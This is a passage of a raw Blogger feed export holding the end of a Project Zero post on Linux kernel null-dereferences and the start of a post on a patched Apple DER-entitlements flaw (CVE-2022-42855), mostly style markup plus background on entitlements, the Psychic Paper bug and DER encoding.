&amp;ldquo;harmless&amp;rdquo; and ensure that the &lt;/span&gt;&lt;span&gt;abrupt&lt;/span&gt;&lt;span&gt;&amp;nbsp;halt of kernel code execution caused by a kernel oops does not lead to other security-relevant primitives.&lt;/span&gt;&lt;/p&gt;"},"link":[{"@rel":"replies","@type":"application/atom+xml","@href":"https://googleprojectzero.blogspot.com/feeds/6288849578901159797/comments/default","@title":"Post Comments"},{"@rel":"replies","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2023/01/exploiting-null-dereferences-in-linux.html#comment-form","@title":"0 Comments"},{"@rel":"edit","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/6288849578901159797"},{"@rel":"self","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/6288849578901159797"},{"@rel":"alternate","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2023/01/exploiting-null-dereferences-in-linux.html","@title":"Exploiting null-dereferences in the Linux kernel"}],"author":{"name":"Google Project Zero","uri":"http://www.blogger.com/profile/08975904405228580347","email":"noreply@blogger.com","gd:image":{"@rel":"http://schemas.google.com/g/2005#thumbnail","@width":"16","@height":"16","@src":"https://img1.blogblog.com/img/b16-rounded.gif"}},"media:thumbnail":{"@xmlns:media":"http://search.yahoo.com/mrss/","@url":"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjW-7Gf0dWd5QJfxXYwRAdtMX7uoynsldEgf9C7saF7MLL_iwIUVaagMyOAa8r-e4_KDf33viQn5U2w1LirUQnx7Vk1fJgpACWUijAl8Pgtiu8ZrDTaiEzJYSo3pJUX_nh4Mh4EQ2GPclwSCHcA-OmGfexegm4WykTZyKnIq9ktGTiLcCJo0QW0VKx6/s72-c/image1.png","@height":"72","@width":"72"},"thr:total":"0"},{"id":"tag:blogger.com,1999:blog-4838136820032157985.post-3562308922263769538","published":"2023-01-12T08:59:00.000-08:00","updated":"2023-01-12T08:59:29.903-08:00","title":{"@type":"text","#text":"DER Entitlements: The (Brief) Return of the Psychic Paper"},"content":{"@type":"html","#text":"&lt;style type=\"text/css\"&gt;@import url('https://themes.googleusercontent.com/fonts/css?kit=pYEwJuzr3ZMDX2Y1syVbvx06if6osnyAslCuLPPf50A');ul.lst-kix_h97ui6n3g8c8-4{list-style-type:none}ul.lst-kix_h97ui6n3g8c8-5{list-style-type:none}ul.lst-kix_h97ui6n3g8c8-2{list-style-type:none}ul.lst-kix_h97ui6n3g8c8-3{list-style-type:none}ul.lst-kix_h97ui6n3g8c8-8{list-style-type:none}ul.lst-kix_h97ui6n3g8c8-6{list-style-type:none}.lst-kix_o4b5kflpgafe-7&gt;li:before{content:\"-  \"}ul.lst-kix_h97ui6n3g8c8-7{list-style-type:none}ul.lst-kix_5nbkgo2blvl3-0{list-style-type:none}ul.lst-kix_5nbkgo2blvl3-1{list-style-type:none}ul.lst-kix_h97ui6n3g8c8-0{list-style-type:none}ul.lst-kix_5nbkgo2blvl3-4{list-style-type:none}.lst-kix_o4b5kflpgafe-8&gt;li:before{content:\"-  \"}ul.lst-kix_h97ui6n3g8c8-1{list-style-type:none}ul.lst-kix_5nbkgo2blvl3-5{list-style-type:none}ul.lst-kix_5nbkgo2blvl3-2{list-style-type:none}ul.lst-kix_5nbkgo2blvl3-3{list-style-type:none}.lst-kix_c2aw6txn2xw5-8&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_5nbkgo2blvl3-8{list-style-type:none}ul.lst-kix_5nbkgo2blvl3-6{list-style-type:none}ul.lst-kix_5nbkgo2blvl3-7{list-style-type:none}.lst-kix_c2aw6txn2xw5-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_c2aw6txn2xw5-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_c2aw6txn2xw5-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_n26z3gtxgors-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_c2aw6txn2xw5-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_n26z3gtxgors-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_c2aw6txn2xw5-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_o4b5kflpgafe-0&gt;li:before{content:\"-  \"}.lst-kix_c2aw6txn2xw5-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_o4b5kflpgafe-1&gt;li:before{content:\"-  \"}.lst-kix_n26z3gtxgors-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_o4b5kflpgafe-2&gt;li:before{content:\"-  \"}.lst-kix_n26z3gtxgors-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_n26z3gtxgors-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_o4b5kflpgafe-3&gt;li:before{content:\"-  \"}.lst-kix_n26z3gtxgors-2&gt;li:before{content:\"\\0025a0  \"}.lst-kix_o4b5kflpgafe-6&gt;li:before{content:\"-  \"}.lst-kix_pb72mncojys1-8&gt;li:before{content:\"\\0025a0  \"}.lst-kix_c2aw6txn2xw5-2&gt;li:before{content:\"\\0025a0  \"}.lst-kix_pb72mncojys1-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_o4b5kflpgafe-4&gt;li:before{content:\"-  \"}.lst-kix_c2aw6txn2xw5-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_o4b5kflpgafe-5&gt;li:before{content:\"-  \"}.lst-kix_n26z3gtxgors-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_pb72mncojys1-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_pb72mncojys1-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_pb72mncojys1-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_pb72mncojys1-2&gt;li:before{content:\"\\0025a0  \"}.lst-kix_pb72mncojys1-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_pb72mncojys1-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_pb72mncojys1-0&gt;li:before{content:\"\\0025cf  \"}ul.lst-kix_n26z3gtxgors-5{list-style-type:none}.lst-kix_mk2jd2ji027g-8&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_n26z3gtxgors-4{list-style-type:none}ul.lst-kix_n26z3gtxgors-7{list-style-type:none}ul.lst-kix_n26z3gtxgors-6{list-style-type:none}ul.lst-kix_n26z3gtxgors-1{list-style-type:none}ul.lst-kix_n26z3gtxgors-0{list-style-type:none}ul.lst-kix_n26z3gtxgors-3{list-style-type:none}.lst-kix_mk2jd2ji027g-7&gt;li:before{content:\"\\0025cb  \"}ul.lst-kix_n26z3gtxgors-2{list-style-type:none}.lst-kix_mk2jd2ji027g-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_mk2jd2ji027g-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_mk2jd2ji027g-5&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_n26z3gtxgors-8{list-style-type:none}.lst-kix_h97ui6n3g8c8-8&gt;li:before{content:\"\\0025a0  \"}.lst-kix_h97ui6n3g8c8-7&gt;li:before{content:\"\\0025cb  \"}ul.lst-kix_o4b5kflpgafe-4{list-style-type:none}ul.lst-kix_o4b5kflpgafe-3{list-style-type:none}ul.lst-kix_o4b5kflpgafe-2{list-style-type:none}.lst-kix_h97ui6n3g8c8-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_h97ui6n3g8c8-6&gt;li:before{content:\"\\0025cf  \"}ul.lst-kix_o4b5kflpgafe-1{list-style-type:none}ul.lst-kix_o4b5kflpgafe-8{list-style-type:none}ul.lst-kix_o4b5kflpgafe-7{list-style-type:none}ul.lst-kix_o4b5kflpgafe-6{list-style-type:none}.lst-kix_h97ui6n3g8c8-5&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_o4b5kflpgafe-5{list-style-type:none}.lst-kix_mk2jd2ji027g-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_h97ui6n3g8c8-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_h97ui6n3g8c8-2&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_o4b5kflpgafe-0{list-style-type:none}.lst-kix_mk2jd2ji027g-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_h97ui6n3g8c8-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_mk2jd2ji027g-2&gt;li:before{content:\"\\0025a0  \"}.lst-kix_mk2jd2ji027g-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_h97ui6n3g8c8-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_5nbkgo2blvl3-5&gt;li:before{content:\"-  \"}ul.lst-kix_pb72mncojys1-5{list-style-type:none}ul.lst-kix_pb72mncojys1-4{list-style-type:none}.lst-kix_5nbkgo2blvl3-6&gt;li:before{content:\"-  \"}.lst-kix_5nbkgo2blvl3-7&gt;li:before{content:\"-  \"}ul.lst-kix_pb72mncojys1-3{list-style-type:none}ul.lst-kix_pb72mncojys1-2{list-style-type:none}ul.lst-kix_pb72mncojys1-8{list-style-type:none}.lst-kix_5nbkgo2blvl3-8&gt;li:before{content:\"-  \"}ul.lst-kix_pb72mncojys1-7{list-style-type:none}ul.lst-kix_pb72mncojys1-6{list-style-type:none}ul.lst-kix_pb72mncojys1-1{list-style-type:none}ul.lst-kix_pb72mncojys1-0{list-style-type:none}ul.lst-kix_mk2jd2ji027g-3{list-style-type:none}ul.lst-kix_c2aw6txn2xw5-2{list-style-type:none}ul.lst-kix_mk2jd2ji027g-2{list-style-type:none}ul.lst-kix_c2aw6txn2xw5-3{list-style-type:none}ul.lst-kix_mk2jd2ji027g-1{list-style-type:none}ul.lst-kix_c2aw6txn2xw5-0{list-style-type:none}ul.lst-kix_mk2jd2ji027g-0{list-style-type:none}ul.lst-kix_c2aw6txn2xw5-1{list-style-type:none}ul.lst-kix_mk2jd2ji027g-7{list-style-type:none}ul.lst-kix_mk2jd2ji027g-6{list-style-type:none}ul.lst-kix_mk2jd2ji027g-5{list-style-type:none}ul.lst-kix_mk2jd2ji027g-4{list-style-type:none}ul.lst-kix_mk2jd2ji027g-8{list-style-type:none}.lst-kix_5nbkgo2blvl3-4&gt;li:before{content:\"-  \"}.lst-kix_5nbkgo2blvl3-2&gt;li:before{content:\"-  \"}.lst-kix_5nbkgo2blvl3-3&gt;li:before{content:\"-  \"}.lst-kix_n26z3gtxgors-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_5nbkgo2blvl3-1&gt;li:before{content:\"-  \"}.lst-kix_n26z3gtxgors-8&gt;li:before{content:\"\\0025a0  \"}.lst-kix_5nbkgo2blvl3-0&gt;li:before{content:\"-  \"}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}ul.lst-kix_c2aw6txn2xw5-6{list-style-type:none}ul.lst-kix_c2aw6txn2xw5-7{list-style-type:none}ul.lst-kix_c2aw6txn2xw5-4{list-style-type:none}ul.lst-kix_c2aw6txn2xw5-5{list-style-type:none}ul.lst-kix_c2aw6txn2xw5-8{list-style-type:none}ol{margin:0;padding:0}table td,table th{padding:0}.wUhACgDjbS-c33{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#fafafa;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#e0e0e0;border-bottom-style:solid}.wUhACgDjbS-c36{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#fafafa;border-left-style:solid;border-bottom-width:1pt;width:471pt;border-top-color:#e0e0e0;border-bottom-style:solid}.wUhACgDjbS-c9{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.wUhACgDjbS-c6{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\";font-style:normal}.wUhACgDjbS-c20{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:center}.wUhACgDjbS-c1{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.wUhACgDjbS-c7{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left;height:11pt}.wUhACgDjbS-c10{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.wUhACgDjbS-c0{font-size:10pt;font-family:Consolas,\"Courier New\";color:#616161;font-weight:400}.wUhACgDjbS-c3{font-size:10pt;font-family:Consolas,\"Courier New\";color:#0f9d58;font-weight:400}.wUhACgDjbS-c16{border-spacing:0;border-collapse:collapse;margin-right:auto}.wUhACgDjbS-c35{margin-left:-3pt;border-spacing:0;border-collapse:collapse;margin-right:auto}.wUhACgDjbS-c15{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.wUhACgDjbS-c11{color:#000000;text-decoration:none;vertical-align:baseline;font-style:normal}.wUhACgDjbS-c31{font-weight:400;text-decoration:none;vertical-align:baseline;font-family:\"Arial\"}.wUhACgDjbS-c26{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.wUhACgDjbS-c32{font-size:10pt;font-family:\"Roboto\";font-weight:400}.wUhACgDjbS-c21{font-weight:400;font-size:16pt;font-family:\"Arial\"}.wUhACgDjbS-c22{text-decoration:none;vertical-align:baseline;font-style:normal}.wUhACgDjbS-c5{font-size:10pt;font-family:Consolas,\"Courier New\";font-weight:400}.wUhACgDjbS-c25{padding:0;margin:0}.wUhACgDjbS-c23{font-weight:400;font-family:Consolas,\"Courier New\"}.wUhACgDjbS-c34{font-weight:700;font-family:\"Arial\"}.wUhACgDjbS-c18{color:inherit;text-decoration:inherit}.wUhACgDjbS-c4{font-weight:400;font-family:\"Courier New\"}.wUhACgDjbS-c19{margin-left:36pt;padding-left:0pt}.wUhACgDjbS-c2{margin-left:36pt;height:11pt}.wUhACgDjbS-c12{height:11pt}.wUhACgDjbS-c24{color:#c53929}.wUhACgDjbS-c8{color:#3367d6}.wUhACgDjbS-c28{color:#455a64}.wUhACgDjbS-c13{color:#000000}.wUhACgDjbS-c17{color:#9c27b0}.wUhACgDjbS-c29{font-style:italic}.wUhACgDjbS-c30{font-size:11pt}.wUhACgDjbS-c14{height:0pt}.wUhACgDjbS-c27{color:#990000}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:\"Arial\"}p{margin:0;color:#000000;font-size:11pt;font-family:\"Arial\"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class=\"c26 doc-content\"&gt;&lt;div&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;Posted by &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;Ivan Fratric, Project Zero&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c13 wUhACgDjbS-c29 wUhACgDjbS-c30 wUhACgDjbS-c31\"&gt;Note: The vulnerability discussed here, CVE-2022-42855, was fixed in iOS 15.7.2 and macOS Monterey 12.6.2. While the vulnerability did not appear to be exploitable on iOS 16 and macOS Ventura, iOS 16.2 and macOS Ventura 13.1 nevertheless shipped hardening changes related to it.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;Last year, I spent a lot of time researching the security of applications built on top of &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c15\"&gt;&lt;a class=\"wUhACgDjbS-c181\" href=\"https://en.wikipedia.org/wiki/XMPP\"&gt;XMPP&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, an instant messaging protocol based on XML. More specifically, my research focused on how subtle quirks in XML parsing can be used to undermine the security of such applications. (If you are interested in learning more about that research, I did a talk on it at Black Hat USA 2022. The slides and the recording can be found &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c15\"&gt;&lt;a class=\"wUhACgDjbS-c181\" href=\"https://www.blackhat.com/us-22/briefings/schedule/index.html#xmpp-stanza-smuggling-or-how-i-hacked-zoom-26618\"&gt;here&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c15\"&gt;&lt;a class=\"wUhACgDjbS-c181\" href=\"https://www.youtube.com/watch?v=ERaRNsvCBrw\"&gt;here&lt;/a&gt;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;).&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;At some point, when a part of my research was published, people pointed out other examples (unrelated to XMPP) where quirks in XML parsing led to security vulnerabilities. One of those examples was a vulnerability dubbed &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c15\"&gt;&lt;a class=\"wUhACgDjbS-c181\" href=\"https://blog.siguza.net/psychicpaper/\"&gt;Psychic Paper&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, a really neat vulnerability in the way Apple operating system checks what &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c29\"&gt;entitlements&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;an application has.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;Entitlements are one of the core security concepts of Apple&amp;rsquo;s operating systems. As &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c15\"&gt;&lt;a class=\"wUhACgDjbS-c181\" href=\"https://developer.apple.com/documentation/bundleresources/entitlements?language=objc\"&gt;Apple&amp;rsquo;s documentation&lt;/a&gt;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;explains, &amp;ldquo;An entitlement is a right or privilege that grants an executable particular capabilities.&amp;rdquo; For example, an application on an Apple operating system can&amp;rsquo;t debug another application without possessing proper entitlements, even if those two applications run as the same user. Even applications running as root can&amp;rsquo;t perform all actions (such as accessing some of the kernel APIs) without appropriate entitlements.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;Psychic Paper was a vulnerability in the way entitlements were checked. Entitlements were stored inside the application&amp;rsquo;s signature blob in the XML format, so naturally the operating system needed to parse those at some point using an XML parser. The problem was that the OS didn&amp;rsquo;t have a single parser for this, but rather a staggering four parsers that were used in different places in the operating system. One parser was used for the initial check that the application only has permitted entitlements, and a different parser was later used when checking whether the application has an entitlement to perform a specific action&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;When giving my talk on XMPP, I gave a challenge to the audience: Find me two different XML parsers that always, for every input, result in the same output. The reason why that is difficult is because XML, although intended to be a simple format, in reality is anything but simple. So it shouldn&amp;rsquo;t come as a surprise that a way was found for one of Apple&amp;#39;s XML parsers to return one set of entitlements and another parser to see a different set of entitlements when parsing the same entitlements blob.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;The fix for the Psychic Paper bug: originally, the problem occurred because Apple had four XML parsers in the OS, so, surprisingly, the fix was to add a fifth one.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;So, after my XMPP research, when I learned about the Psychic Paper bug, I decided to take a look at these XML parsers and see if I can somehow find another way to trigger the bug even after the fix. After playing with various Apple XML parsers, I had an XML snippet I wanted to try out. However when I actually tried to use it in an application, I discovered that the system for checking entitlements behaved completely differently than I thought. This was because of&amp;hellip;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"wUhACgDjbS-c9\" id=\"h.143u383vs24\"&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c21\"&gt;DER Entitlements&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;According to &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c15\"&gt;&lt;a class=\"wUhACgDjbS-c181\" href=\"https://developer.apple.com/documentation/xcode/using-the-latest-code-signature-format\"&gt;Apple developer documentation&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &amp;ldquo;Starting in iOS 15, iPadOS 15, tvOS 15, and watchOS 8, the system checks for a new, more secure signature format that uses Distinguished Encoding Rules, or DER, to embed entitlements into your app&amp;rsquo;s signature&amp;rdquo;. As &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c15\"&gt;&lt;a class=\"wUhACgDjbS-c181\" href=\"https://developer.apple.com/documentation/technotes/tn3125-inside-code-signing-provisioning-profiles#The-future-is-DER\"&gt;another Apple article&lt;/a&gt;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;boldly proclaims, &amp;ldquo;The future is DER&amp;rdquo;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;So, what is DER?&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;Unlike the previous text-based XML format, &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c15\"&gt;&lt;a class=\"wUhACgDjbS-c181\" href=\"https://en.wikipedia.org/wiki/X.690#DER_encoding\"&gt;DER&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a binary format, also commonly used in digital certificates. The format is specified in the &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c15\"&gt;&lt;a class=\"wUhACgDjbS-c181\" href=\"https://www.itu.int/ITU-T/studygroups/com17/languages/X.690-0207.pdf\"&gt;X.690 standard&lt;/a&gt;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;DER follows relatively simple type-length-data encoding rules. An image from the specification illustrates that:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_ctQx4QBRr-XKiIsWHuUO3d6r1cbG935MHyu2EXDNwm1tWeaGC1A5yniZErHOJ8qqwg185tDe6tU4u8ObWuPf-0CnLI9Pk5QhdQBOKcK6YAzqg30Xz1cuDtkcX9ryZ70vGbk3JKVwwkB0ozGkW6jqEIl-Q7jpeQZTM0PXmGtbsB7g1ApOut3xBwOX/s599/image2.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_ctQx4QBRr-XKiIsWHuUO3d6r1cbG935MHyu2EXDNwm1tWeaGC1A5yniZErHOJ8qqwg185tDe6tU4u8ObWuPf-0CnLI9Pk5QhdQBOKcK6YAzqg30Xz1cuDtkcX9ryZ70vGbk3JKVwwkB0ozGkW6jqEIl-Q7jpeQZTM0PXmGtbsB7g1ApOut3xBwOX/s599/image2.png\" border=\"0\" alt=\"\" style=\"max-height: 750px; max-width: 600px;\"title=\"\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;The Identifier field encodes the object type, which can be a primitive (e.g. a string or a boolean), but also a &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c29\"&gt;constructed&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;type (an object containing other objects, e.g. an array/sequence). The length field encodes the number of bytes in the content. Length can be encoded differently, depending on the length of content (e.g. if content is smaller than 128 bytes, then the length field only takes a single byte). Length field is followed by the content itself. In case of constructed types, the content is also encoded using the same encoding rules.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;An &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c15\"&gt;&lt;a class=\"wUhACgDjbS-c181\" href=\"https://developer.apple.com/documentation/technotes/tn3125-inside-code-signing-provisioning-profiles#The-future-is-DER\"&gt;example from Apple developer documentation&lt;/a&gt;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;shows what DER-encoded entitlements might look like:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.b0d92d5a95e353be337a6acc5beb2363c4a55559\"&gt;&lt;/a&gt;&lt;a id=\"t.0\"&gt;&lt;/a&gt;&lt;table class=\"wUhACgDjbS-c16\"&gt;&lt;tr class=\"wUhACgDjbS-c14\"&gt;&lt;td class=\"wUhACgDjbS-c33\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;appl &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;[&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 